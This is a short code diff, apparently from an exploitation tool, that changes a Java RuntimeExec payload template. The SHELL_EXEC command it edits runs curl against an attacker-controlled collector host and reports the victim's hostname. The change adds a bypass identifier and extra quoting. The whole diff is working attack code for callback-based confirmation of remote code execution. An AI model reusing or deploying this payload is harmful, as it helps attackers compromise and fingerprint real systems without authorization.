@@ -28,5 +28,5 @@ class Payload(CompiledJavaPayload):
 
     template_path = 'templates/RuntimeExec.java.tpl'
     template_context = {
-        'SHELL_EXEC': 'curl http://$ATTACKER_HOST:$COLLECTOR_PORT/collect/?id=$VICTIM_HOST',
+        'SHELL_EXEC': r'curl \"http://$ATTACKER_HOST:$COLLECTOR_PORT/collect/?id=$VICTIM_HOST&bypass_id=$BYPASS_ID\"',
     }
